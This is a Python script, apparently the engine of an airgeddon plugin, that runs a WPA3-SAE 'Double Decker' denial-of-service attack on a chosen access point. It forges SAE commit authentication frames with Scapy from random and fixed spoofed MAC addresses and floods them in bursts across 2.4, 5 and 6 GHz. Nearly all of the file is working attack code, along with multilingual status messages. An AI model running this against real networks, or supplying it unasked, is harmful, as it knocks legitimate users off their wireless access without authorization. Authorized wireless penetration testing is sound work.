# -*- coding: utf-8 -*-

"""
WPA3-SAE Double Decker DoS - airgeddon plugin Python engine.
Combines omnivore (random MACs) + muted (static MAC) attack modes with 20 SAE pairs.
Supports 2.4 GHz, 5 GHz, and 6 GHz (requires airgeddon >= 12.0 for 6 GHz).
"""

import sys
import time
import random
from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC, sendp

GROUP_ID_BYTES = b"\x13\x00"
BURST_SIZE = 128
PACKETS_PER_SEC = 1000

ARR = {}

def init_lang():
    global ARR
    ARR = {
        # Message 0 - Initializing
        ("ENGLISH",  0): "Initializing Double Decker attack...",
        ("SPANISH",  0): "Inicializando ataque Double Decker...",
        ("FRENCH",   0): "Initialisation de l'attaque Double Decker...",
        ("CATALAN",  0): "Inicialitzant atac Double Decker...",
        ("PORTUGUESE",0): "Iniciando ataque Double Decker...",
        ("RUSSIAN",  0): "Инициализация атаки Double Decker...",
        ("GREEK",    0): "Αρχικοποίηση επίθεσης Double Decker...",
        ("ITALIAN",  0): "Inizializzando attacco Double Decker...",
        ("POLISH",   0): "Inicjalizacja ataku Double Decker...",
        ("GERMAN",   0): "Initialisiere Double Decker Angriff...",
        ("TURKISH",  0): "Double Decker saldırısı başlatılıyor...",
        ("ARABIC",   0): "...Double Decker بدء تهيئة هجوم",
        ("CHINESE",  0): "正在初始化 Double Decker 攻击...",

        # Message 1 - Launching
        ("ENGLISH",  1): "Launching WPA3 Double Decker attack",
        ("SPANISH",  1): "Lanzando ataque WPA3 Double Decker",
        ("FRENCH",   1): "Lancement de l'attaque WPA3 Double Decker",
        ("CATALAN",  1): "Llançant atac WPA3 Double Decker",
        ("PORTUGUESE",1): "Lançando ataque WPA3 Double Decker",
        ("RUSSIAN",  1): "Запуск атаки WPA3 Double Decker",
        ("GREEK",    1): "Εκκίνηση επίθεσης WPA3 Double Decker",
        ("ITALIAN",  1): "Avvio attacco WPA3 Double Decker",
        ("POLISH",   1): "Uruchamianie ataku WPA3 Double Decker",
        ("GERMAN",   1): "Starte WPA3 Double Decker Angriff",
        ("TURKISH",  1): "WPA3 Double Decker saldırısı başlatılıyor",
        ("ARABIC",   1): "WPA3 Double Decker بدء هجوم",
        ("CHINESE",  1): "启动 WPA3 Double Decker 攻击",

        # Message 2 - Target info
        ("ENGLISH",  2): "Target: {bssid} on channel {channel} ({freq} MHz)",
        ("SPANISH",  2): "Objetivo: {bssid} en el canal {channel} ({freq} MHz)",
        ("FRENCH",   2): "Cible : {bssid} sur le canal {channel} ({freq} MHz)",
        ("CATALAN",  2): "Objectiu: {bssid} al canal {channel} ({freq} MHz)",
        ("PORTUGUESE",2): "Alvo: {bssid} no canal {channel} ({freq} MHz)",
        ("RUSSIAN",  2): "Цель: {bssid} на канале {channel} ({freq} МГц)",
        ("GREEK",    2): "Στόχος: {bssid} στο κανάλι {channel} ({freq} MHz)",
        ("ITALIAN",  2): "Obiettivo: {bssid} sul canale {channel} ({freq} MHz)",
        ("POLISH",   2): "Cel: {bssid} na kanale {channel} ({freq} MHz)",
        ("GERMAN",   2): "Ziel: {bssid} auf Kanal {channel} ({freq} MHz)",
        ("TURKISH",  2): "Hedef: {bssid} kanal {channel} ({freq} MHz)",
        ("ARABIC",   2): "({freq} MHz) على القناة {channel} {bssid} :الهدف",
        ("CHINESE",  2): "目标：{bssid} 信道 {channel}（{freq} MHz）",

        # Message 3 - No SAE pairs error
        ("ENGLISH",  3): "ERROR: No SAE pairs provided - aborting.",
        ("SPANISH",  3): "ERROR: No se proporcionaron pares SAE - abortando.",
        ("FRENCH",   3): "ERREUR : Aucune paire SAE fournie - abandon.",
        ("CATALAN",  3): "ERROR: No s'han proporcionat parells SAE - avortant.",
        ("PORTUGUESE",3): "ERRO: Nenhum par SAE fornecido - abortando.",
        ("RUSSIAN",  3): "ОШИБКА: не предоставлены пары SAE - прерывание.",
        ("GREEK",    3): "ΣΦΑΛΜΑ: Δεν δόθηκαν ζεύγη SAE - ματαίωση.",
        ("ITALIAN",  3): "ERRORE: Nessuna coppia SAE fornita - arresto.",
        ("POLISH",   3): "BŁĄD: Nie podano par SAE - przerywanie.",
        ("GERMAN",   3): "FEHLER: Keine SAE-Paare bereitgestellt - Abbruch.",
        ("TURKISH",  3): "HATA: SAE çifti sağlanmadı - iptal ediliyor.",
        ("ARABIC",   3): "خطأ: لم يتم توفير أزواج SAE - إجهاض.",
        ("CHINESE",  3): "错误：未提供 SAE 对 - 正在中止。",

        # Message 4 - Loaded pairs
        ("ENGLISH",  4): "Loaded {count} SAE pairs.",
        ("SPANISH",  4): "{count} pares SAE cargados.",
        ("FRENCH",   4): "{count} paires SAE chargées.",
        ("CATALAN",  4): "{count} parells SAE carregats.",
        ("PORTUGUESE",4): "{count} pares SAE carregados.",
        ("RUSSIAN",  4): "Загружено {count} пар SAE.",
        ("GREEK",    4): "Φορτώθηκαν {count} ζεύγη SAE.",
        ("ITALIAN",  4): "Caricate {count} coppie SAE.",
        ("POLISH",   4): "Załadowano {count} par SAE.",
        ("GERMAN",   4): "{count} SAE-Paare geladen.",
        ("TURKISH",  4): "{count} SAE çifti yüklendi.",
        ("ARABIC",   4): "تم تحميل {count} زوجًا من SAE",
        ("CHINESE",  4): "已加载 {count} 个 SAE 对。",

        # Message 5 - Progress
        ("ENGLISH",  5): "Sent {count} Double Decker frames...",
        ("SPANISH",  5): "Enviados {count} tramas Double Decker...",
        ("FRENCH",   5): "{count} trames Double Decker envoyées...",
        ("CATALAN",  5): "Enviats {count} frames Double Decker...",
        ("PORTUGUESE",5): "Enviados {count} quadros Double Decker...",
        ("RUSSIAN",  5): "Отправлено {count} кадров Double Decker...",
        ("GREEK",    5): "Εστάλησαν {count} πλαίσια Double Decker...",
        ("ITALIAN",  5): "Inviati {count} frame Double Decker...",
        ("POLISH",   5): "Wysłano {count} ramek Double Decker...",
        ("GERMAN",   5): "{count} Double-Decker-Frames gesendet...",
        ("TURKISH",  5): "{count} Double Decker çerçevesi gönderildi...",
        ("ARABIC",   5): "...Double Decker إطار {count} تم إرسال",
        ("CHINESE",  5): "已发送 {count} 个 Double Decker 帧...",
    }

def msg(lang, key, **kw):
    return ARR.get((lang, key), ARR.get(("ENGLISH", key), "")).format(**kw)

def get_freq(channel: int, band: str = "") -> int:
    """Return frequency in MHz for 2.4, 5, and 6 GHz channels.
    The band parameter (passed from airgeddon >= 12.0) is required to
    correctly resolve channels shared between 2.4 GHz and 6 GHz (e.g. ch 1).
    """
    if band == "6GHz":
        return 5945 + channel * 5
    if 1 <= channel <= 13:
        return 2407 + channel * 5
    if channel == 14:
        return 2484
    if 32 <= channel <= 177:
        return 5000 + channel * 5
    return 2412

def make_sae_commit(mac, bssid, scalar_hex, finite_hex):
    return (RadioTap() /
            Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid) /
            Dot11Auth(algo=3, seqnum=1, status=0) /
            GROUP_ID_BYTES /
            bytes.fromhex(scalar_hex) /
            bytes.fromhex(finite_hex))

def run_attack(bssid, channel, interface, language, pairs, band=""):
    sys.stdout.reconfigure(line_buffering=True, write_through=True)
    use_cr = sys.stdout.isatty()

    freq = get_freq(int(channel), band)
    print(msg(language, 0), flush=True)
    print()
    print(msg(language, 1), flush=True)
    print(msg(language, 2, bssid=bssid, channel=channel, freq=freq), flush=True)
    print(msg(language, 4, count=len(pairs)), flush=True)
    print()

    static_mac = str(RandMAC())
    counter = 0
    next_log = 2000
    progress_printed = False

    while True:
        try:
            scalar, finite = random.choice(pairs)
            pkts = []

            for _ in range(BURST_SIZE // 2):
                pkts.append(make_sae_commit(str(RandMAC()), bssid, scalar, finite))
            for _ in range(BURST_SIZE // 2):
                pkts.append(make_sae_commit(static_mac, bssid, scalar, finite))

            sendp(pkts, iface=interface, verbose=False)
            counter += BURST_SIZE

            if counter >= next_log:
                m = msg(language, 5, count=counter)
                if use_cr:
                    sys.stdout.write(f"\r{m}\x1b[K")
                    sys.stdout.flush()
                else:
                    if progress_printed:
                        sys.stdout.write("\033[F")
                    sys.stdout.write(f"{m}\x1b[K\n")
                    sys.stdout.flush()
                    progress_printed = True
                next_log += 2000

            time.sleep(max(0.01, 1.0 / (PACKETS_PER_SEC / BURST_SIZE)))

        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) < 6:
        sys.exit("Usage: double_decker_attack.py <bssid> <channel> <interface> <language> <pairs> [band]")

    bssid     = sys.argv[1]
    channel   = sys.argv[2]
    interface = sys.argv[3]
    language  = sys.argv[4]
    raw_pairs = sys.argv[5]

    band     = sys.argv[6] if len(sys.argv) > 6 else ""

    pairs = []
    for token in raw_pairs.split(";"):
        parts = token.strip().split(",")
        if len(parts) == 2 and len(parts[0]) == 64 and len(parts[1]) == 128:
            pairs.append((parts[0].strip(), parts[1].strip()))

    init_lang()

    if not pairs:
        print(msg(language, 3))
        sys.exit(1)

    run_attack(bssid, channel, interface, language, pairs, band)
